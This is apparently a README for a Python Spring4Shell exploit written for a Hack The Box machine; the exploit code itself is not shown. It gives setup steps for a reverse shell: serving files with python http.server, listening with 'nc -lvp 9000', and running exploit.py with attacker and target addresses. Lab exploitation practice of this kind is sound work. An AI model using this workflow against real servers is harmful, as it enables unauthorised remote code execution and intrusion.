# Spring4Shell
A Spring Framework exploit I wrote in python for a box I was doing on Hack the box.

# Requirements
You must have the following python library:
> Request

> time

> arg.parse

# Setup:
In order to gain shell, 
1. You must first start a file server (python3 -m http.server.
2. Then you use netcat to listen by typing nc -lvp 9000
3. then run the exploit.py with the hostname, your ip, server port, and the port you are listening on with netcat. Example: ./exploit.py -li <your ip> -lp 8000 -ri <server ip> -rp <server port> --listening-port <nc listening port>
